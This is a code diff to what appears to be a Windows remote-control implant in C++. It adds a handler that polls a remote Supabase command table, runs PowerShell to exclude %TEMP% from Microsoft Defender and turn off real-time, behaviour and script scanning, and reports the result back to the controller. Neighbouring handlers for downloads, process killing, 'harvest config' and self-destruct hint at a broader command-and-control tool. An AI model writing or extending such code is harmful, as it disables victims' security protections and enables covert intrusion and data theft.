@@ -2345,6 +2345,35 @@ static void CheckAndHandleKill() {
     LogMsg("Kill: " + type + ":" + value + " -> exit " + std::to_string((int)exitCode));
 }
 
+static void CheckAndHandleDefender() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.disable_defender&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
+    if (resp.size() < 10) return;
+    std::string rowId = ExtractJSONNumber(resp, "id");
+    std::string action = ExtractJSONString(resp, "payload");
+    if (rowId.empty() || action.empty()) return;
+    if (action != "disable" && action != "enable") return;
+    DWORD exitCode = 0;
+    std::string cmd;
+    if (action == "disable") {
+        cmd = "powershell -NoProfile -Command \"Add-MpPreference -ExclusionPath '%TEMP%'; Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true\"";
+    } else {
+        cmd = "powershell -NoProfile -Command \"Remove-MpPreference -ExclusionPath '%TEMP%'; Set-MpPreference -DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false -DisableScriptScanning $false\"";
+    }
+    std::string output = ExecuteCommand(cmd, &exitCode);
+    if (output.empty()) output = "(no output)";
+    if (exitCode != 0 && output.find("Access is denied") != std::string::npos) exitCode = 2;
+    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"disable_defender " + EscapeJSON(action) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":" + std::to_string((int)exitCode) + "}]";
+    HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
+    json = "{\"executed\":true}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+    LogMsg("Defender: " + action + " -> exit " + std::to_string((int)exitCode));
+}
+
 static void SendHeartbeat() {
     // Upload crash logs if any
     char tmp[MAX_PATH];
@@ -2692,6 +2721,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 CheckAndHandleDownload();
                 CheckAndHandleProclist();
                 CheckAndHandleKill();
+                CheckAndHandleDefender();
                 CheckHarvestConfig();
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
